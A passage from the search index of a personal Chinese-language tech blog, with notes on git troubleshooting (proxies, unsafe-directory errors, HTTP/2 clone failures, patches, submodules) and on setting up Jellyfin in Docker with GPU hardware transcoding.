\u4ee3\u7406","text":"","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#windows","title":"windows","text":"<p>windows \u4e0b\u6ca1\u6709 nc \u547d\u4ee4\uff0c\u9700\u8981 connect.exe\uff08\u53ef\u4ee5\u4e0b\u8f7d.c \u6587\u4ef6\u7f16\u8bd1\u6210 exe \u6587\u4ef6\uff09</p> <p>SSH in git behind proxy on windows 7 - Stack Overflow</p> <pre><code>Host github.com\n  HostName github.com\n  ...\n  ProxyCommand connect -H 127.0.0.1:11223 %h %p\n</code></pre>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#unsafe-directory","title":"unsafe directory","text":"<p>git - Fatal error \"unsafe repository ('/home/repon' is owned by someone else)\" - Stack Overflow</p> <p>git version &gt; Git 2.36</p> <p><code>git config --global --add safe.directory '*'</code></p>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#curl-92-http2-stream-0-was-not-closed-cleanly-cancel-err-8","title":"curl 92 HTTP/2 stream 0 was not closed cleanly: CANCEL (err 8)","text":"<pre><code>\u279c  repo git clone https://github.com/YaoFANGUK/video-subtitle-generator\nCloning into 'video-subtitle-generator'...\nremote: Enumerating objects: 434, done.\nremote: Counting objects: 100% (95/95), done.\nremote: Compressing objects: 100% (53/53), done.\nerror: RPC failed; curl 92 HTTP/2 stream 0 was not closed cleanly: CANCEL (err 8)\nerror: 503 bytes of body are still expected\nfetch-pack: unexpected disconnect while reading sideband packet\nfatal: early EOF\nfatal: fetch-pack: invalid index-pack output\n</code></pre> <p>git - error: RPC failed; curl 92 HTTP/2 stream 0 was not closed cleanly: PROTOCOL_ERROR (err 1) - Stack Overflow</p> <pre><code>git config --global http.version HTTP/1.1\n</code></pre> <p>\u6210\u529f</p> <pre><code>\u279c  repo git clone https://github.com/YaoFANGUK/video-subtitle-generator\nCloning into 'video-subtitle-generator'...\nremote: Enumerating objects: 434, done.\nremote: Counting objects: 100% (95/95), done.\nremote: Compressing objects: 100% (53/53), done.\nremote: Total 434 (delta 46), reused 87 (delta 42), pack-reused 339\nReceiving objects: 100% (434/434), 5.92 GiB | 21.39 MiB/s, done.\nResolving deltas: 100% (149/149), done.\nUpdating files: 100% (151/151), done.\n</code></pre> <p>\u8c8c\u4f3c\u4fee\u6539 buffer \u4e5f\u53ef\u4ee5\uff1aGIT \u63a8\u9001\u9519\u8bef error: RPC failed\uff1bcurl 92 HTTP/2 stream 0 was not closed cleanly: CANCEL (err 8) - \u90ed\u5c0f\u777f - \u535a\u5ba2\u56ed (cnblogs.com)</p> <pre><code>git config --global http.postBuffer 524288000\n</code></pre>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#patch-\u8865\u4e01","title":"patch \u8865\u4e01","text":"<p>Git \u6253\u8865\u4e01-- patch \u548c diff \u7684\u4f7f\u7528\uff08\u8be6\u7ec6\uff09 - \u6398\u91d1 (juejin.cn)</p> <p>Git \u63d0\u4f9b\u4e86\u4e24\u79cd\u8865\u4e01\u65b9\u6848\uff0c\u4e00\u662f\u7528 git diff \u751f\u6210\u7684 UNIX \u6807\u51c6\u8865\u4e01.diff \u6587\u4ef6\uff0c\u4e8c\u662f git format-patch \u751f\u6210\u7684 Git \u4e13\u7528.patch \u6587\u4ef6\u3002 .diff \u6587\u4ef6\u53ea\u662f\u8bb0\u5f55\u6587\u4ef6\u6539\u53d8\u7684\u5185\u5bb9\uff0c\u4e0d\u5e26\u6709 commit \u8bb0\u5f55\u4fe1\u606f\uff0c\u591a\u4e2a commit \u53ef\u4ee5\u5408\u5e76\u6210\u4e00\u4e2a diff \u6587\u4ef6\u3002 .patch \u6587\u4ef6\u5e26\u6709\u8bb0\u5f55\u6587\u4ef6\u6539\u53d8\u7684\u5185\u5bb9\uff0c\u4e5f\u5e26\u6709 commit \u8bb0\u5f55\u4fe1\u606f\uff0c\u6bcf\u4e2a commit \u5bf9\u5e94\u4e00\u4e2a patch \u6587\u4ef6\u3002</p> <pre><code>git format-patch HEAD^  # \u6700\u65b0\u7684\u4e00\u6b21 commit\uff08\u4e0a\u4e00\u6b21\u5230\u73b0\u5728\u7684 commit\uff09\ngit format-patch \u3010commit sha1 id\u3011..\u3010commit sha1 id\u3011 # \u67d0\u4e24\u6b21\u63d0\u4ea4\u4e4b\u95f4\u7684\u6240\u6709patch\n</code></pre> <ul> <li><code>-o</code>: If -o is specified, output files are created in dir. Otherwise they are created in the current working directory</li> <li><code>-n</code>: -n, --numbered Name output in [PATCH n/m] format, even with a single patch.</li> </ul> <pre><code>git am \u3010path/to/xxx.patch\u3011\n</code></pre> <p>git diff \u76f8\u5173</p> <pre><code>git diff \u3010commit sha1 id\u3011 \u3010commit sha1 id\u3011 &gt; \u3010diff\u6587\u4ef6\u540d\u3011\ngit diff --no-index file1 file2 # \u975egit repo\u4e0b\uff0c\u751f\u6210\u4e24\u4e2a\u6587\u4ef6diff\n</code></pre> <pre><code>git apply [--check] \u3010path/to/xxx.patch\ngit apply --check \u3010path/to/xxx.diff\u3011\n</code></pre>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#format-patch","title":"format-patch","text":"<p>Git - git-format-patch Documentation (git-scm.com)</p> <pre><code>git format-patch HEAD^  # \u6700\u65b0\u7684\u4e00\u6b21 commit\uff08\u4e0a\u4e00\u6b21\u5230\u73b0\u5728\u7684 commit\uff09\ngit format-patch \u3010commit sha1 id\u3011..\u3010commit sha1 id\u3011 # \u67d0\u4e24\u6b21\u63d0\u4ea4\u4e4b\u95f4\u7684\u6240\u6709patch\n</code></pre> <p>\u5e94\u7528 patch</p> <pre><code>git am patch/*.patch\n</code></pre>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#submodule","title":"submodule","text":"<p>\u53ef\u4ee5\u672c\u5730\u6dfb\u52a0 submodule</p> <pre><code>git submodule add ./third-party/nvbit_release third-party/nvbit_release\n</code></pre> <p>\u6dfb\u52a0 submodule \u540e\u4f1a\u751f\u6210<code>.gitmodules</code>\u6587\u4ef6</p> <pre><code>[submodule \"third-party/gpu-rodinia\"]\n        path = third-party/gpu-rodinia\n        url = ./third-party/gpu-rodinia\n[submodule \"third-party/nvbit_release\"]\n        path = third-party/nvbit_release\n        url = ./third-party/nvbit_release\n[submodule \"third-party/cuda-samples\"]\n        path = third-party/cuda-samples\n        url = ./third-party/cuda-samples\n[submodule \"third-party/gpu-parboil\"]\n        path = third-party/gpu-parboil\n        url = ./third-party/gpu-parboil\n</code></pre>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#clone-submodule","title":"clone submodule","text":"<p>clone \u65f6\u9ed8\u8ba4\u662f\u4e0d\u4f1a clone \u5b50\u6a21\u5757\u7684\uff0c\u9700\u8981\u6dfb\u52a0 recursive\u3002-j8 \u8868\u793a\u4f7f\u7528\u591a\u7ebf\u7a0b\u4e0b\u8f7d\u3002</p> <pre><code>git clone --recursive -j8 gpu-analysis-model gpu-analysis-model-70\n</code></pre> <p>\u4f1a\u4ece<code>.gitmodules</code>\u4e2d\u6307\u5b9a\u7684 url \u4e2d clone \u4ed3\u5e93\uff0c\u7136\u540e checkout \u5230\u5bf9\u5e94 commit\u3002\u5982\u679c\u662f\u672c\u5730 commit\uff0c\u6ca1\u6709\u63a8\u9001\u5230\u8fdc\u7a0b\uff0c\u5219\u4f1a\u56e0\u4e3a\u6ca1\u6709\u5bf9\u5e94 commit \u800c\u62a5\u9519\u3002\u89e3\u51b3\u65b9\u6cd5\u662f\u6539\u7528\u672c\u5730\u4ed3\u5e93\u4f5c\u4e3a url\u3002</p> <pre><code>git submodule init\ngit submodule update\n\n# \u5408\u5e76\u6210\u4e00\u4e2a\ngit submodule update --init --recursive\n</code></pre>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#file-not-allowed-\u95ee\u9898","title":"file not allowed \u95ee\u9898","text":"<pre><code>Submodule 'third-party/cuda-samples' (/staff/fyyuan/repo/gpu-analysis-model/third-party/cuda-samples) registered for path 'third-party/cuda-samples'\n\nCloning into '/staff/fyyuan/repo/gpu-analysis-model-70/third-party/cuda-samples'...\nfatal: transport 'file' not allowed\n</code></pre> <p>\u89e3\u51b3\u65b9\u6cd5</p> <pre><code>git config --global protocol.file.allow always\n</code></pre>","tags":["git"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/","title":"jellyfin \u76f8\u5173","text":"<p>\u8bb0\u5f55 jellyfin \u76f8\u5173\u4f7f\u7528</p>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#jellyfin-\u5b89\u88c5--docker","title":"jellyfin \u5b89\u88c5--docker","text":"<p>\u53c2\u8003\uff1aContainer | Jellyfin \u4e09\u4e2a\u4e0d\u540c\u955c\u50cf\u6e90\uff1a</p> <ul> <li>Official container image:\u00a0<code>jellyfin/jellyfin</code> .</li> <li>LinuxServer.io image:\u00a0<code>linuxserver/jellyfin</code> .</li> <li>hotio image:\u00a0<code>hotio/jellyfin</code> .</li> </ul> <p>\u67e5\u770b\u5b83\u4eec\u7684 Dockerfile\uff0c\u53ef\u4ee5\u770b\u5230\u5b89\u88c5\u4e86\u4e0d\u540c\u663e\u5361\u7684\u9a71\u52a8\uff0c\u5305\u542b va-api\uff0copencl\u3002</p> <pre><code>nvidia-opencl-icd-340 \\\ni965-va-driver \\\nmesa-va-drivers &amp;&amp; \\\n</code></pre>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#gpu-\u8f6c\u7801\u786c\u4ef6\u52a0\u901f","title":"gpu \u8f6c\u7801\u786c\u4ef6\u52a0\u901f","text":"<p>Intel GPU | Jellyfin</p>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#devdri","title":"dev/dri","text":"<p>\u9ed8\u8ba4\u5df2\u7ecf\u8bbe\u7f6e\u597d\u7528\u6237\u6743\u9650\u4e86</p> <p>docker-compose \u4e2d\u8bbe\u7f6e</p> <pre><code>devices:\n      - /dev/dri/:/dev/dri/\n</code></pre> <pre><code>root@689728fac458:/# l -alh /dev/dri\ntotal 0\ndrwxr-xr-x 2 root root                80 Sep 29 19:41 ./\ndrwxr-xr-x 6 root root               360 Sep 29 19:41 ../\ncrw-rw---- 1 root video         226,   0 Sep 29 19:41 card0\ncrw-rw---- 1 root videoGaFCwCBc 226, 128 Sep 29 19:41 renderD128\nroot@689728fac458:/# id 1000\nuid=1000(abc) gid=1000(abc) groups=1000(abc),44(video),100(users),104(videoGaFCwCBc)\nroot@689728fac458:/#\n</code></pre>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#nvidia-gpu","title":"nvidia gpu","text":"<p>NVIDIA GPU | Jellyfin</p> <pre><code>version: '3'\nservices:\n  jellyfin:\n    image: jellyfin/jellyfin\n    user: 1000:1000\n    network_mode: 'host'\n    volumes:\n      - /path/to/config:/config\n      - /path/to/cache:/cache\n      - /path/to/media:/media\n    runtime: nvidia\n    deploy:\n      resources:\n        reservations:\n          devices:\n            - capabilities: [gpu]\n</code></pre> <p>Installing the NVIDIA Container Toolkit \u2014 container-toolkit 1.14.1 documentation</p> <pre><code>sudo nvidia-ctk runtime configure --runtime=docker\n\nsudo systemctl restart docker\n</code></pre>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#linux-\u8fc1\u79fb\u5230-docker","title":"linux \u8fc1\u79fb\u5230 docker","text":"<p>Migrating | Jellyfin</p> <pre><code>version: '3'\nservices:\n  jellyfin:\n    image: jellyfin/jellyfin\n    user: &lt;uid&gt;:&lt;gid&gt;\n    network_mode: 'host'\n    restart: 'unless-stopped'\n    environment:\n      - JELLYFIN_CACHE_DIR=/var/cache/jellyfin\n      - JELLYFIN_CONFIG_DIR=/etc/jellyfin\n      - JELLYFIN_DATA_DIR=/var/lib/jellyfin\n      - JELLYFIN_LOG_DIR=/var/log/jellyfin\n    volumes:\n      - /etc/jellyfin:/etc/jellyfin\n      - /var/cache/jellyfin:/var/cache/jellyfin\n      - /var/lib/jellyfin:/var/lib/jellyfin\n      - /var/log/jellyfin:/var/log/jellyfin\n      - &lt;path-to-media&gt;:&lt;path-to-media&gt;\n</code></pre> <p>\u9700\u8981\u5907\u4efd\u6570\u636e\u5305\u542b 4 \u90e8\u5206</p> <pre><code>      - /var/lib/docker/docker_data/jellyfin/cache:/var/cache/jellyfin\n      - /var/lib/docker/docker_data/jellyfin/log:/var/log/jellyfin\n      - /var/lib/docker/docker_data/jellyfin/data:/var/lib/jellyfin\n      - /var/lib/docker/docker_data/jellyfin/etc:/etc/jellyfin\n</code></pre>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#jellyfin-\u8bbe\u7f6e","title":"jellyfin \u8bbe\u7f6e","text":"<p>\u4e00\u4e9b\u7ecf\u9a8c</p> <ul> <li>\u6539\u53d8 jellyfin \u8f6c\u7801\u8bbe\u7f6e\uff0c\u662f\u7acb\u5373\u751f\u6548\u7684\uff0c\u65e0\u9700\u91cd\u542f docker</li> <li>\u5b9e\u6d4b RX550 \u7684\u8584\u5f31 GPU \u6027\u80fd\uff0c\u52fe\u9009 HEVC 10bit \u89e3\u7801\uff0c\u53cd\u800c\u4f1a\u62d6\u7d2f\u7f16\u7801\u8fc7\u7a0b\uff0c\u5e27\u6570\u66f4\u4f4e\u3002</li> </ul> <p>\u8bbe\u7f6e/\u9996\u9875</p> <ul> <li>\u53ef\u4ee5\u8c03\u6574\u5a92\u4f53\u5e93\u663e\u793a\u987a\u5e8f</li> <li>\u53ef\u4ee5\u5c06\u4e0d\u540c\u5a92\u4f53\u5e93\u7ec4\u5408\u6210\u4e00\u4e2a\u663e\u793a</li> </ul> <p>\u8bbe\u7f6e/\u64ad\u653e</p> <ul> <li>\u97f3\u9891\u9009\u62e9\uff1a\u64ad\u653e\u9ed8\u8ba4\u97f3\u9891</li> <li>\u5bb6\u5ead\u7f51\u7edc\u8d28\u91cf\uff1a\u8bbe\u7f6e\u9ed8\u8ba4\u7684\u4e32\u6d41\u7801\u7387\uff0c\u5982 20Mbps</li> <li>\u4f18\u5148\u4f7f\u7528 fMP4-HLS \u5a92\u4f53\u5bb9\u5668\uff1a\u4e0d\u77e5\u9053\u5982\u4f55\u751f\u6548</li> </ul> <p>\u4f18\u5148\u4f7f\u7528 fMP4 \u4f5c\u4e3a HLS \u64ad\u653e\u7684\u9ed8\u8ba4\u5bb9\u5668\uff0c\u4ece\u800c\u53ef\u4ee5\u5728\u652f\u6301\u7684\u8bbe\u5907\u4e0a\u76f4\u63a5\u4e32\u6d41 HEVC \u683c\u5f0f\u7684\u5185\u5bb9</p> <p>\u5b57\u5e55</p> <ul> <li>\u5b57\u5e55\u504f\u597d\uff1a\u504f\u597d\u5b57\u5e55\uff0c\u4e0b\u9762\u5b57\u5e55\u6a21\u5f0f\u9700\u8981\u4f7f\u7528</li> <li>\u5b57\u5e55\u6a21\u5f0f\uff1a\u63a8\u8350\u8bbe\u7f6e\u4e3a\u603b\u662f\u663e\u793a<ul> <li>\u667a\u80fd\uff1a\u97f3\u9891\u4e3a\u5916\u8bed\u65f6\uff0c\u52a0\u8f7d\u504f\u597d\u5b57\u5e55\uff0c\u5426\u5219\u65e0\u5b57\u5e55\u3002\u4e0d\u592a\u9002\u7528\uff0c\u56e0\u4e3a\uff1a1 \u591a\u97f3\u9891\u65f6\u65e0\u6548\uff0c2 \u5373\u4f7f\u662f\u4e2d\u6587\u89c6\u9891\uff0c\u6700\u597d\u4e5f\u6709\u5b57\u5e55</li> <li>\u603b\u662f\u663e\u793a\uff1a\u663e\u793a\u504f\u597d\u5b57\u5e55\u3002\u9002\u7528\u6027\u6700\u597d\uff0c\u5f53\u6709\u504f\u597d\u5b57\u5e55\u65f6\u4f1a\u9009\u62e9\u504f\u597d\uff0c\u6ca1\u6709\u65f6\u9009\u62e9\u9ed8\u8ba4\u3002</li> <li>\u9ed8\u8ba4\uff1a\u6839\u636e\u5143\u6570\u636e\u4e2d\u201c\u9ed8\u8ba4\u201d\uff0c\u201c\u5f3a\u5236\u201d\u6765\u663e\u793a\u5b57\u5e55\u3002\u53ef\u4ee5\u770b\u4f5c\u603b\u662f\u663e\u793a\u7684\u5b50\u96c6</li> <li>\u5f3a\u5236\uff1a\u6839\u636e\u5143\u6570\u636e\u4e2d\u201c\u5f3a\u5236\u201d\u6765\u663e\u793a\u5b57\u5e55</li> <li>\u65e0\u5b57\u5e55</li> </ul> </li> <li>\u662f\u5426\u70e7\u5f55\u5b57\u5e55<ul> <li>\u81ea\u52a8\uff1a\u56fe\u7247\u683c\u5f0f\u6216\u590d\u6742 ass/ssa \u5b57\u5e55\uff08\u5ba2\u6237\u7aef\u53ef\u80fd\u4e0d\u652f\u6301\u663e\u793a\uff09</li> </ul> </li> </ul> <p>p.s \u5efa\u8bae\u4ee5\u540e\u652f\u6301\u4e00\u79cd\u66f4\u7075\u6d3b\u7684\u8bbe\u7f6e\u65b9\u6cd5\uff1a\u65e0\u5b57\u5e55\uff0c\u97f3\u9891\u5339\u914d\u504f\u597d\u5219\u65e0\u5b57\u5e55\uff0c\u504f\u597d\u5b57\u5e55\uff0c\u9ed8\u8ba4\uff0c\u5f3a\u5236\u3002\u901a\u8fc7\u8c03\u8282\u8fd9\u51e0\u4e2a\u9009\u9879\u7684\u987a\u5e8f\u6765\u5b9e\u73b0\u4e0d\u540c\u7b56\u7565</p>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#jellyfin-\u786c\u4ef6\u52a0\u901f","title":"jellyfin \u786c\u4ef6\u52a0\u901f","text":"<p>\u53c2\u8003\uff1aHardware Acceleration | Jellyfin</p> <p>Jellyfin supports\u00a0hardware acceleration (HWA) of video encoding/decoding using FFMpeg. FFMpeg and Jellyfin can support multiple hardware acceleration implementations such as Intel Quicksync (QSV), AMD AMF and NVIDIA NVENC/NVDEC through Video Acceleration APIs.</p>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u57fa\u7840\u77e5\u8bc6","title":"\u57fa\u7840\u77e5\u8bc6","text":"","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5e38\u89c1\u89c6\u9891\u7f16\u7801","title":"\u5e38\u89c1\u89c6\u9891\u7f16\u7801","text":"<ul> <li>H.264/h264/AVC<ul> <li>Profile: High 10 = H.264 10bit\uff1a\u76ee\u524d\u6ca1\u6709\u786c\u4ef6\u652f\u6301 h264 10bit \u89e3\u7801</li> </ul> </li> <li>H.265/HEVC<ul> <li>Profile: Main, Main 10</li> </ul> </li> </ul>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u6d4f\u89c8\u5668\u652f\u6301\u7684\u7f16\u7801","title":"\u6d4f\u89c8\u5668\u652f\u6301\u7684\u7f16\u7801","text":"<p>Codec Support | Jellyfin</p>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u4e0d\u540c\u786c\u4ef6\u652f\u6301","title":"\u4e0d\u540c\u786c\u4ef6\u652f\u6301","text":"<p>\u4e0d\u540c\u663e\u5361\u5bf9\u5e94\u652f\u6301\u7684\u786c\u4ef6\u7f16\u89e3\u7801 API\uff1a</p> <ul> <li>NVIDIA: NVENC</li> <li>AMD: AMF, VA-API</li> <li>Intel: QSV, VA-API</li> <li>Apple: VideoToolbox</li> <li>RPi: V4L2</li> </ul> <p>\u4e0d\u540c\u65b9\u6848\u53c2\u8003\uff1a CPU \u7f16\u89e3\u7801\uff1ah265 -&gt; h264 GPU \u7f16\u89e3\u7801\uff1ah265 -&gt; GPU -&gt; \u4e2d\u95f4\u5e27 -&gt; GPU -&gt; h254 CPU \u89e3\u7801\uff0cGPU \u7f16\u7801\uff1ah265 10bit -&gt; CPU -&gt; \u4e2d\u95f4\u5e27 -&gt; GPU -&gt; h254</p>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u6d4b\u8bd5\u65b9\u6cd5","title":"\u6d4b\u8bd5\u65b9\u6cd5","text":"<p>\u8c03\u8bd5\u65f6\uff0c\u53ef\u4ee5\u4ece jellyfin \u65e5\u5fd7\u4e2d\u628a\u547d\u4ee4\u590d\u5236\u4e0b\u6765\uff0c\u6765\u5feb\u901f\u5224\u65ad\u662f\u5426\u53ef\u4ee5\u5de5\u4f5c\u6b63\u5e38\u3002</p> <ul> <li>vaapi \u6d4b\u8bd5</li> </ul> <pre><code>ffmpeg -init_hw_device vaapi=va:/dev/dri/renderD128\n</code></pre> <pre><code># Check the QSV and VA-API codecs\ndocker exec -it jellyfin /usr/lib/jellyfin-ffmpeg/vainfo\n\n# Check the OpenCL runtime status\ndocker exec -it jellyfin /usr/lib/jellyfin-ffmpeg/ffmpeg -v verbose -init_hw_device vaapi=va -init_hw_device opencl@va\n</code></pre> <p>\u8c03\u7528 VA-API \u5931\u8d25\uff08/dev/dri/renderD128 \u6743\u9650\u9519\u8bef\u5bfc\u81f4\uff09</p> <pre><code>[AVHWDeviceContext @ 0x557d76500880] No VA display found for device /dev/dri/renderD128.\nDevice creation failed: -22.\nFailed to set value 'vaapi=va:/dev/dri/renderD128' for option 'init_hw_device': Invalid argument\nError parsing global options: Invalid argument\n</code></pre> <p>OpenCL \u8bbe\u5907\u6ca1\u627e\u5230\uff08\u5f00\u542f tone-mapping \u540e\uff0camd gpu \u9700\u8981\u5b89\u88c5 opencl \u9a71\u52a8\uff09</p> <pre><code>[AVHWDeviceContext @ 0x56158f868900] No matching devices found.\nDevice creation failed: -19.\nFailed to set value 'opencl=ocl:0.0' for option 'init_hw_device': No such device\nError parsing global options: No such device\n</code></pre>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#intel-\u6838\u663e","title":"intel \u6838\u663e","text":"<p>Intel GPU | Jellyfin</p> <ul> <li>\u8f6c\u7801\uff1aQSV, VA-API</li> <li>HDR tonne mapping\uff1aQSV, OpenCL</li> </ul> <p>vainfo \u67e5\u770b QSV \u548c VA-API \u652f\u6301\u60c5\u51b5</p> <ul> <li><code>iHD driver</code>\u00a0indicates support for the QSV and VA-API interfaces.</li> <li><code>i965 driver</code>\u00a0indicates only support for the VA-API interface, which should only be used on pre-Broadwell platforms.</li> </ul> <pre><code>root@689728fac458:/# /usr/lib/jellyfin-ffmpeg/vainfo --display drm --device /dev/dri/renderD128\nTrying display: drm\nlibva info: VA-API version 1.19.0\nlibva info: Trying to open /usr/lib/jellyfin-ffmpeg/lib/dri/iHD_drv_video.so\nlibva info: Found init function __vaDriverInit_1_19\nlibva info: va_openDriver() returns 0\nvainfo: VA-API version: 1.19 (libva 2.19.0)\nvainfo: Driver version: Intel iHD driver for Intel(R) Gen Graphics - 23.3.2 (95dc859)\nvainfo: Supported profile and entrypoints\n      VAProfileNone                   : VAEntrypointVideoProc\n      VAProfileNone                   : VAEntrypointStats\n      VAProfileMPEG2Simple            : VAEntrypointVLD\n      VAProfileMPEG2Main              : VAEntrypointVLD\n      VAProfileH264Main               : VAEntrypointVLD\n      VAProfileH264Main               : VAEntrypointEncSliceLP\n      VAProfileH264High               : VAEntrypointVLD\n      VAProfileH264High               : VAEntrypointEncSliceLP\n      VAProfileVC1Simple              : VAEntrypointVLD\n      VAProfileVC1Main                : VAEntrypointVLD\n      VAProfileVC1Advanced            : VAEntrypointVLD\n      VAProfileJPEGBaseline           : VAEntrypointVLD\n      VAProfileJPEGBaseline           : VAEntrypointEncPicture\n      VAProfileH264ConstrainedBaseline: VAEntrypointVLD\n      VAProfileH264ConstrainedBaseline: VAEntrypointEncSliceLP\n      VAProfileVP8Version0_3          : VAEntrypointVLD\n      VAProfileHEVCMain               : VAEntrypointVLD\n      VAProfileHEVCMain               : VAEntrypointEncSliceLP\n      VAProfileHEVCMain10             : VAEntrypointVLD\n      VAProfileHEVCMain10             : VAEntrypointEncSliceLP\n      VAProfileVP9Profile0            : VAEntrypointVLD\n      VAProfileVP9Profile0            : VAEntrypointEncSliceLP\n      VAProfileVP9Profile1            : VAEntrypointVLD\n      VAProfileVP9Profile1            : VAEntrypointEncSliceLP\n      VAProfileVP9Profile2            : VAEntrypointVLD\n      VAProfileVP9Profile2            : VAEntrypointEncSliceLP\n      VAProfileVP9Profile3            : VAEntrypointVLD\n      VAProfileVP9Profile3            : VAEntrypointEncSliceLP\n      VAProfileHEVCMain422_10         : VAEntrypointVLD\n      VAProfileHEVCMain444            : VAEntrypointVLD\n      VAProfileHEVCMain444            : VAEntrypointEncSliceLP\n      VAProfileHEVCMain444_10         : VAEntrypointVLD\n      VAProfileHEVCMain444_10         : VAEntrypointEncSliceLP\n</code></pre>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5176\u5b83\u9009\u9879","title":"\u5176\u5b83\u9009\u9879","text":"<p>\u53cd\u4ea4\u9519\u65f6\u4f7f\u5e27\u7387\u7ffb\u500d</p> <p>\u6b64\u8bbe\u7f6e\u4f7f\u7528\u53bb\u9694\u884c\u65f6\u7684\u573a\u9891\uff0c\u901a\u5e38\u79f0\u4e3a Bob \u53bb\u9694\u884c\uff0c\u5b83\u5c06\u89c6\u9891\u7684\u5e27\u9891\u52a0\u500d\uff0c\u4ee5\u63d0\u4f9b\u5b8c\u6574\u7684\u8fd0\u52a8\u6548\u679c\uff0c\u5c31\u50cf\u5728\u7535\u89c6\u4e0a\u89c2\u770b\u9694\u884c\u89c6\u9891\u65f6\u770b\u5230\u7684\u90a3\u6837\u3002</p> <p>\u5141\u8bb8\u5b9e\u65f6\u63d0\u53d6\u5b57\u5e55\uff1a\u5efa\u8bae\u5173\u95ed</p> <p>\u4e3a\u907f\u514d\u89c6\u9891\u8f6c\u7801\uff0c\u53ef\u4ee5\u4ece\u89c6\u9891\u4e2d\u63d0\u53d6\u5185\u7f6e\u7684\u5b57\u5e55\uff0c\u5e76\u4ee5\u7eaf\u6587\u672c\u7684\u5f62\u5f0f\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002\u5728\u67d0\u4e9b\u7cfb\u7edf\u4e2d\u8fd9\u4e2a\u63d0\u53d6\u7684\u8fdb\u7a0b\u53ef\u80fd\u4f1a\u82b1\u8d39\u8f83\u957f\u65f6\u95f4\u5e76\u5bfc\u81f4\u89c6\u9891\u64ad\u653e\u51fa\u73b0\u5361\u987f\u3002\u5982\u679c\u7981\u7528\u8fd9\u4e2a\u9009\u9879\uff0c\u5f53\u5185\u7f6e\u5b57\u5e55\u4e0d\u80fd\u88ab\u5ba2\u6237\u7aef\u8bbe\u5907\u539f\u751f\u652f\u6301\u65f6\uff0c\u5b57\u5e55\u5c06\u901a\u8fc7\u89c6\u9891\u8f6c\u7801\u88ab\u70e7\u5f55\u8fdb\u89c6\u9891\u4e2d\u3002</p> <ul> <li>\u4e0d\u660e\u767d\u5176\u4e2d\u5185\u7f6e\u5b57\u5e55\u4e0d\u80fd\u88ab\u5ba2\u6237\u7aef\u652f\u6301\u662f\u4ec0\u4e48\u610f\u601d\u3002\u4f46\u662f\u5982\u679c\u5f00\u542f\u6539\u9009\u9879\uff0c\u963f\u91cc\u4e91\u7684\u89c6\u9891\u64ad\u653e\u8fc7\u7a0b\u65e0\u6cd5\u663e\u793a\u5b57\u5e55\uff08\u63d0\u53d6\u901f\u5ea6\u592a\u6162\uff09\uff0c\u4e00\u76f4\u663e\u793a\u63d0\u53d6\u5143\u6570\u636e</li> 